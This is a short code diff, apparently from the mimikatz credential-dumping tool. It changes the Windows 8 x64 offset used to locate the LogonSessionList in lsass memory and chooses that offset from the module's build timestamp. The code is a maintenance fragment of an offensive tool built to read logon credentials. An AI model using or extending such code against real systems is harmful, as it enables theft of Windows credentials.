@@ -14,7 +14,7 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -60}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -59}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -61}},
+	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -0}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WIN81_LogonSessionList),	PTRN_WIN81_LogonSessionList},	{0, NULL}, {-4, -53}},
 };
 #elif defined _M_IX86
@@ -37,6 +37,9 @@ PULONG LogonSessionListCount = NULL;
 BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
 {
 	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
+#ifdef _M_X64
+	LsaSrvReferences[4].Offsets.off1 = (pLib->Informations.TimeDateStamp > 0x53480000) ? -54 : -61; // 6.2 post or pre KB
+#endif
 	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  sizeof(LsaSrvReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL);
 }
 
